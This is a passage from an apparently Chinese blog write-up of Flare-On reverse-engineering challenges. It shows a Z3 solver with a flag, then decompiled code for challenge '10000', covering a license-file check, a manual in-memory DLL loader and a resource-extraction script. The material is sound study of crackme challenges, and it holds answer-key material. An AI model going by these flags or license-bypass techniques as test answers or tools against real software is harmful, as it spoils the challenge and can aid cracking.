class="string">&quot;Solving...&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result_indices = []</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">        idx = model[choices[i]].as_long()</span><br><span class="line">        result_indices.append(idx)</span><br><span class="line">        val = matrix[i][idx]</span><br><span class="line">        total += val</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Row <span class="subst">&#123;i&#125;</span>: selected index <span class="subst">&#123;idx&#125;</span>, value = 0x<span class="subst">&#123;val:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nTotal sum = 0x<span class="subst">&#123;total &amp; MASK64:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Target     = 0x<span class="subst">&#123;TARGET:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Match!&quot;</span> <span class="keyword">if</span> (total &amp; MASK64) == TARGET <span class="keyword">else</span> <span class="string">&quot;Mismatch!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>找到解：<font color=lime><strong>4498291314891210521449296</strong></font></p>
<p><font color=deepskyblue><strong><a href="mailto:&#x73;&#48;&#x6d;&#51;&#116;&#x31;&#109;&#x65;&#x73;&#95;&#49;&#116;&#x5f;&#x64;&#x6f;&#51;&#115;&#95;&#x6e;&#111;&#x74;&#x5f;&#x6d;&#x34;&#107;&#x65;&#x5f;&#97;&#110;&#121;&#x5f;&#x73;&#x33;&#110;&#x35;&#x65;&#x40;&#x66;&#x6c;&#97;&#114;&#101;&#x2d;&#x6f;&#110;&#46;&#99;&#x6f;&#109;">s0m3t1mes_1t_do3s_not_m4ke_any_s3n5e@flare-on.com</a></strong></font></p>
<h1 id="9-10000"><a href="#9-10000" class="headerlink" title="#9 10000"></a>#9 10000</h1><h2 id="9-1-主程序初始分析"><a href="#9-1-主程序初始分析" class="headerlink" title="#9.1 主程序初始分析"></a>#9.1 主程序初始分析</h2><p>程序中存在1GB的数据，分析主函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">main_0</span>(argc, argv, envp);</span><br><span class="line">  string = <span class="built_in">load_string</span>(buffer, <span class="string">&quot;checking license file...&quot;</span>);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(__int64))print_string)(string);</span><br><span class="line">  v4 = <span class="built_in">or</span>(<span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">open_file</span>((__int64)v17, (__int64)<span class="string">&quot;license.bin&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">read_file</span>((__int64)v18, v17);</span><br><span class="line">  Size = <span class="built_in">load_size</span>((__int64)v18);</span><br><span class="line">  <span class="keyword">if</span> ( Size == <span class="number">340000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::istream::<span class="built_in">seekg</span>(v17, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    file = <span class="built_in">operator_new</span>(Size);</span><br><span class="line">    std::istream::<span class="built_in">read</span>(v17, file, Size);</span><br><span class="line">    <span class="built_in">SHA_256</span>((__int64)file, (__int64)file + <span class="number">340000</span>, (__int64)hash, (__int64)v17, <span class="number">0x100000</span>);</span><br><span class="line">    *(_QWORD *)&amp;n[<span class="number">1</span>] = file;</span><br><span class="line">    v23 = v19;</span><br><span class="line">    <span class="built_in">init_vector_int</span>(v15, <span class="number">10000</span>, (__int64)v19);</span><br><span class="line">    <span class="keyword">for</span> ( n[<span class="number">0</span>] = <span class="number">0</span>; n[<span class="number">0</span>] &lt;= <span class="number">9999</span>; ++n[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      i = **(_WORD **)&amp;n[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( i &gt; <span class="number">9999u</span> )</span><br><span class="line">        <span class="keyword">goto</span> FAIL;</span><br><span class="line">      <span class="built_in">set_vector_size</span>((__int64)v19 + <span class="number">1</span>, (__int64 *)v15, i);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">is_zero</span>((__int64)v19 + <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">goto</span> FAIL;</span><br><span class="line">      <span class="built_in">set_vector_size</span>((__int64)v20, (__int64 *)v15, i);</span><br><span class="line">      <span class="built_in">or_with</span>((__int64)v20, <span class="number">1</span>);</span><br><span class="line">      *(_QWORD *)&amp;n[<span class="number">1</span>] += <span class="number">2LL</span>;</span><br><span class="line">      v24 = <span class="built_in">LOAD_DLL</span>(i);</span><br><span class="line">      v7 = (__int64)(v24 + <span class="number">1</span>);</span><br><span class="line">      *(_QWORD *)&amp;v22[<span class="number">1</span>] = v22;</span><br><span class="line">      <span class="built_in">find_function</span>((__int64)v21, (__int64)<span class="string">&quot;_Z5checkPh&quot;</span>, (__int64)v22);</span><br><span class="line">      check = (__int64 (__fastcall **)(_QWORD))<span class="built_in">get_addr_of_check</span>(v7, (__int64)v21);</span><br><span class="line">      <span class="built_in">LODWORD</span>(v7) = (*check)(*(_QWORD *)&amp;n[<span class="number">1</span>]) ^ <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">next_index</span>((__int64)v21);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)v7 )</span><br><span class="line">        <span class="keyword">goto</span> FAIL;</span><br><span class="line">      *(_QWORD *)&amp;n[<span class="number">1</span>] += <span class="number">32LL</span>;</span><br><span class="line">      <span class="built_in">free_obj</span>(n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(Output, Target, <span class="number">40000u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">FAIL:</span><br><span class="line">      v9 = <span class="built_in">load_string</span>(buffer, <span class="string">&quot;invalid license file&quot;</span>);</span><br><span class="line">      ((<span class="built_in">void</span> (__fastcall *)(__int64))print_string)(v9);</span><br><span class="line">      v6 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> EXIT;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="built_in">load_string</span>(buffer, <span class="string">&quot;license valid!&quot;</span>);</span><br><span class="line">    ((<span class="built_in">void</span> (__fastcall *)(__int64))print_string)(v10);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;Src[<span class="number">4</span>], <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">LODWORD</span>(Size_1) = <span class="number">80</span>;</span><br><span class="line">    <span class="built_in">AES_256</span>((__int64)&amp;enc, <span class="number">0x50u</span>, (__int64)hash, <span class="number">0x20u</span>, (__int64)&amp;iv, &amp;Src[<span class="number">4</span>], Size_1, Src);</span><br><span class="line">    v11 = <span class="built_in">load_string_</span>((__int64 *)buffer, &amp;Src[<span class="number">4</span>]);</span><br><span class="line">    ((<span class="built_in">void</span> (__fastcall *)(__int64 *))print_string)(v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">EXIT:</span><br><span class="line">    <span class="built_in">clear</span>((__int64)v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">load_string</span>(buffer, <span class="string">&quot;invalid license file&quot;</span>);</span><br><span class="line">    ((<span class="built_in">void</span> (__fastcall *)(__int64))print_string)(v5);</span><br><span class="line">    v6 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::ifstream::~ifstream(v17);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序首先获取目标<font color=lime><strong>license.bin</strong></font>，读到34万字节后，每34字节带入检验，前2字节作为dll的索引，后32字节作为输入，过了dll内check函数的校验之后还需要过外层memcmp校验（因为有顺序问题），查看负责加载程序中的10000个校验dll的函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_OWORD *__fastcall <span class="title">LOAD_DLL</span><span class="params">(__int64 idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  idx_ = idx;</span><br><span class="line">  idx__ = (<span class="type">unsigned</span> __int16)idx;</span><br><span class="line">  v2 = <span class="built_in">sub_7FF6797BF750</span>((__int64)&amp;unk_7FF679822C80);</span><br><span class="line">  v3 = <span class="built_in">sub_7FF6797BF780</span>((__int64)&amp;unk_7FF679822C80);</span><br><span class="line">  v12 = <span class="built_in">sub_7FF6797123B1</span>(v3, v2, idx__);</span><br><span class="line">  v13 = <span class="built_in">sub_7FF6797BF750</span>((__int64)&amp;unk_7FF679822C80);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">sub_7FF679731500</span>((__int64)&amp;v12, (__int64)&amp;v13) )</span><br><span class="line">    <span class="keyword">return</span> *(_OWORD **)<span class="built_in">sub_7FF6797330F0</span>((__int64)&amp;v12);</span><br><span class="line">  v5 = <span class="built_in">sub_7FF6797D9F00</span>(<span class="number">0x40u</span>);</span><br><span class="line">  *v5 = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_7FF67972D670</span>((__int64)v5);</span><br><span class="line">  v11 = v5;</span><br><span class="line">  *(_WORD *)v5 = idx_;</span><br><span class="line">  hResInfo = <span class="built_in">FindResourceA</span>(<span class="number">0</span>, (LPCSTR)idx_, (LPCSTR)<span class="number">0xA</span>);</span><br><span class="line">  hResData = <span class="built_in">LoadResource</span>(<span class="number">0</span>, hResInfo);</span><br><span class="line">  *(_QWORD *)&amp;zipfile[<span class="number">1</span>] = <span class="built_in">LockResource</span>(hResData);</span><br><span class="line">  zipfile[<span class="number">0</span>] = <span class="built_in">SizeofResource</span>(<span class="number">0</span>, hResInfo);</span><br><span class="line">  decompress_size = <span class="built_in">get_decompress_size</span>(*(<span class="type">unsigned</span> __int8 **)&amp;zipfile[<span class="number">1</span>], zipfile[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_7FF6797D0C30</span>((__int64)v10, decompress_size);</span><br><span class="line">  dllfile = <span class="built_in">sub_7FF6797397D0</span>(v10, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">LZSS_decompress</span>(*(<span class="type">unsigned</span> __int8 **)&amp;zipfile[<span class="number">1</span>], dllfile, zipfile[<span class="number">0</span>], decompress_size, <span class="number">0</span>);</span><br><span class="line">  v40 = *(<span class="type">int</span> *)(dllfile + <span class="number">60</span>) + dllfile;</span><br><span class="line">  dllfile_1 = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">80</span>), <span class="number">0x3000u</span>, <span class="number">0x40u</span>);</span><br><span class="line">  *((_QWORD *)v11 + <span class="number">1</span>) = dllfile_1;</span><br><span class="line">  v52 = (<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">24</span> + *(<span class="type">unsigned</span> __int16 *)(v40 + <span class="number">20</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *(<span class="type">unsigned</span> __int16 *)(v40 + <span class="number">6</span>); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dllfile_1[v52[<span class="number">3</span>]], (<span class="type">const</span> <span class="type">void</span> *)(dllfile + v52[<span class="number">5</span>]), v52[<span class="number">4</span>]);</span><br><span class="line">    v52 += <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">144</span>)]; *((_DWORD *)j + <span class="number">3</span>); j += <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    name_of_dll = &amp;dllfile_1[*((<span class="type">unsigned</span> <span class="type">int</span> *)j + <span class="number">3</span>)];</span><br><span class="line">    v49 = (FARPROC *)&amp;dllfile_1[*((<span class="type">unsigned</span> <span class="type">int</span> *)j + <span class="number">4</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*name_of_dll - <span class="number">48</span>) &gt; <span class="number">9</span></span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)(name_of_dll[<span class="number">1</span>] - <span class="number">48</span>) &gt; <span class="number">9</span></span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)(name_of_dll[<span class="number">2</span>] - <span class="number">48</span>) &gt; <span class="number">9</span></span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)(name_of_dll[<span class="number">3</span>] - <span class="number">48</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      hModule = <span class="built_in">LoadLibraryA</span>(name_of_dll);</span><br><span class="line">      <span class="keyword">while</span> ( *v49 )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = &amp;dllfile_1[(_QWORD)*v49];</span><br><span class="line">        ProcAddress = <span class="built_in">GetProcAddress</span>(hModule, v19 + <span class="number">2</span>);</span><br><span class="line">        *v49++ = ProcAddress;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      n0x270F_3 = <span class="built_in">atoi</span>(name_of_dll);</span><br><span class="line">      v23 = <span class="built_in">LOAD_DLL</span>(n0x270F_3);</span><br><span class="line">      <span class="keyword">while</span> ( *v49 )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = &amp;dllfile_1[(_QWORD)*v49];</span><br><span class="line">        v6 = (__int64)(v23 + <span class="number">1</span>);</span><br><span class="line">        v17 = v15;</span><br><span class="line">        <span class="built_in">find_function</span>((__int64)v14, (__int64)(v22 + <span class="number">2</span>), (__int64)v15);</span><br><span class="line">        v21 = *(<span class="built_in">INT_PTR</span> (__stdcall **)())<span class="built_in">get_addr_of_check</span>(v6, (__int64)v14);</span><br><span class="line">        <span class="built_in">next_index</span>((__int64)v14);</span><br><span class="line">        *v49++ = v21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v38 = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">136</span>)];</span><br><span class="line">  v37 = &amp;dllfile_1[*((<span class="type">unsigned</span> <span class="type">int</span> *)v38 + <span class="number">8</span>)];</span><br><span class="line">  v36 = &amp;dllfile_1[*((<span class="type">unsigned</span> <span class="type">int</span> *)v38 + <span class="number">9</span>)];</span><br><span class="line">  v35 = &amp;dllfile_1[*((<span class="type">unsigned</span> <span class="type">int</span> *)v38 + <span class="number">7</span>)];</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; *((_DWORD *)v38 + <span class="number">6</span>); ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    p__Z5checkPh = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v37[<span class="number">4</span> * k]];</span><br><span class="line">    v27 = *(_WORD *)&amp;v36[<span class="number">2</span> * k];</span><br><span class="line">    v26 = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v35[<span class="number">4</span> * v27]];</span><br><span class="line">    v7 = v26;</span><br><span class="line">    v8 = (__int64)(v11 + <span class="number">1</span>);</span><br><span class="line">    *(_QWORD *)&amp;v16[<span class="number">1</span>] = v16;</span><br><span class="line">    <span class="built_in">find_function</span>((__int64)v15 + <span class="number">1</span>, (__int64)p__Z5checkPh, (__int64)v16);</span><br><span class="line">    *(_QWORD *)<span class="built_in">get_addr_of_check</span>(v8, (__int64)v15 + <span class="number">1</span>) = v7;</span><br><span class="line">    <span class="built_in">next_index</span>((__int64)v15 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v34 = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">176</span>)];</span><br><span class="line">  v33 = *(_DWORD *)(v40 + <span class="number">180</span>);</span><br><span class="line">  v47 = (<span class="type">unsigned</span> <span class="type">int</span> *)v34;</span><br><span class="line">  v32 = &amp;dllfile_1[-*(_QWORD *)(v40 + <span class="number">48</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v47 &lt; (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v34[v33] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( m = v47 + <span class="number">2</span>; m &lt; (<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)v47 + v47[<span class="number">1</span>]); m = (<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)m + <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v29 = &amp;dllfile_1[(*(_WORD *)m &amp; <span class="number">0xFFF</span>) + (<span class="type">unsigned</span> __int64)*v47];</span><br><span class="line">      <span class="keyword">switch</span> ( *((_BYTE *)m + <span class="number">1</span>) &amp; <span class="number">0xF0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">160</span>:</span><br><span class="line">          *(_QWORD *)v29 += v32;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">48</span>:</span><br><span class="line">          *(_QWORD *)v29 += (<span class="type">unsigned</span> <span class="type">int</span>)v32;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">          *(_QWORD *)v29 += <span class="built_in">WORD1</span>(v32);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">          *(_QWORD *)v29 += (<span class="type">unsigned</span> __int16)v32;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v47 = m;</span><br><span class="line">  &#125;</span><br><span class="line">  v31 = &amp;dllfile_1[*(<span class="type">unsigned</span> <span class="type">int</span> *)(v40 + <span class="number">40</span>)];</span><br><span class="line">  v30 = ((__int64 (__fastcall *)(_DWORD *, __int64, _QWORD))v31)(Output, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_7FF6797BF7E0</span>((__int64)&amp;unk_7FF679822C80, (__int64)&amp;v11);</span><br><span class="line">  v4 = v11;</span><br><span class="line">  <span class="built_in">sub_7FF679796660</span>(v10);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>共计有10000个dll（0000~9999），以某种自定义格式压缩，每次运行时会递归解压缩所有主dll所需的dll并缓存在内存中，之后使用时直接调用，解压完毕后程序会查找主dll内的<font color=red><strong>check</strong></font>函数，找到后用其检验license中的32字节，10000个全部通过且<font color=red><strong>Output</strong></font>等于<font color=red><strong>Target</strong></font>中的10000个dword即用dll的sha256作为AES256密钥解密密文并输出flag</p>
<h2 id="9-2-提取dll数据并解压"><a href="#9-2-提取dll数据并解压" class="headerlink" title="#9.2 提取dll数据并解压"></a>#9.2 提取dll数据并解压</h2><p>编写脚本提取所有dll：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&quot;10000.exe&quot;</span>, fast_load=<span class="literal">True</span>)</span><br><span class="line">rsrc_rva = pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">2</span>].VirtualAddress</span><br><span class="line">rsrc_offset = pe.get_offset_from_rva(rsrc_rva)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;10000.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mm = mmap.mmap(f.fileno(), <span class="number">0</span>, access=mmap.ACCESS_READ)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_dir_entry</span>(<span class="params">offset</span>):</span><br><span class="line">        data = mm[offset:offset+<span class="number">8</span>]</span><br><span class="line">        name_id, offset_to_data = struct.unpack(<span class="string">&quot;&lt;II&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> name_id, offset_to_data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_dir_header</span>(<span class="params">offset</span>):</span><br><span class="line">        data = mm[offset:offset+<span class="number">16</span>] (Characteristics, TimeDateStamp, MajorVersion, MinorVersion, NumNamed, NumId) = struct.unpack(<span class="string">&quot;&lt;IIHHHH&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> NumNamed, NumId</span><br><span class="line">    num_named, num_id = read_dir_header(rsrc_offset)</span><br><span class="line">    entries_offset = rsrc_offset + <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_named + num_id):</span><br><span class="line">        entry_offset = entries_offset + i * <span class="number">8</span></span><br><span class="line">        name_id, offset_to_data = read_dir_entry(entry_offset)</span><br><span class="line">        is_dir = offset_to_data &amp; <span class="number">0x80000000</span></span><br><span class="line">        offset_to_data &amp;= <span class="number">0x7FFFFFFF</span></span><br><span class="line">        type_id = name_id &amp; <span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">if</span> type_id == <span class="number">0xA</span>:</span><br><span class="line">            type_dir_offset = rsrc_offset + offset_to_data</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    num_named, num_id = read_dir_header(type_dir_offset)</span><br><span class="line">    entries_offset = type_dir_offset + <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_named + num_id):</span><br><span class="line">        entry_offset = entries_offset + i * <span class="number">8</span></span><br><span class="line">        name_id, offset_to_data = read_dir_entry(entry_offset)</span><br><span class="line">        dll_id = name_id &amp; <span class="number">0xFFFF</span></span><br><span class="line">        is_dir = offset_to_data &amp; <span class="number">0x80000000</span></span><br><span class="line">        offset_to_data &amp;= <span class="number">0x7FFFFFFF</span></span><br><span class="line">        lang_dir_offset = rsrc_offset + offset_to_data</span><br><span class="line">        num_named_lang, num_id_lang = read_dir_header(lang_dir_offset)</span><br><span class="line">        lang_entry_offset = lang_dir_offset + <span class="number">16</span></span><br><span class="line">        _, data_entry_offset_raw = read_dir_entry(lang_entry_offset)</span><br><span class="line">        data_entry_offset = rsrc_offset + (data_entry_offset_raw &amp; <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">        data_rva, data_size, codepage, reserved = struct.unpack(<span class="string">&quot;&lt;IIII&quot;</span>, mm[data_entry_offset:data_entry_offset+<span class="number">16</span>])</span><br><span class="line">        data_offset = pe.get_offset_from_rva(data_rva)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ID=<span class="subst">&#123;dll_id&#125;</span>, RVA=<span class="subst">&#123;<span class="built_in">hex</span>(data_rva)&#125;</span>, size=<span class="subst">&#123;data_size&#125;</span>, file_offset=<span class="subst">&#123;<span class="built_in">hex</span>(data_offset)&#125;</span>&quot;</span>)</span><br><span class="line">        data = mm[data_offset:data_offset+data_size]</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;bins/dll_<span class="subst">&#123;dll_id&#125;</span>.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(data)</span><br></pre></td></tr></table></figure>

